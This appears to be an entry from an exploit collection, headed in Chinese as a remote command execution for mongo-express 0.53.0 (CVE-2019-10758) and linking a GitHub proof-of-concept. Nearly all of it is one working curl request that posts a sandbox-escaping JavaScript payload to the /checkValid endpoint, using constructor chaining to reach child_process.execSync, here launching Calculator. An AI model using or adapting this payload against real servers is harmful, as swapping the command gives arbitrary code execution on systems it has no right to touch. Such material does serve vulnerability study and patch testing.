### mongo-express@0.53.0远程命令执行(**CVE**-2019-10758)

```
curl 'http://localhost:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("/Applications/Calculator.app/Contents/MacOS/Calculator")'
```

https://github.com/masahiro331/CVE-2019-10758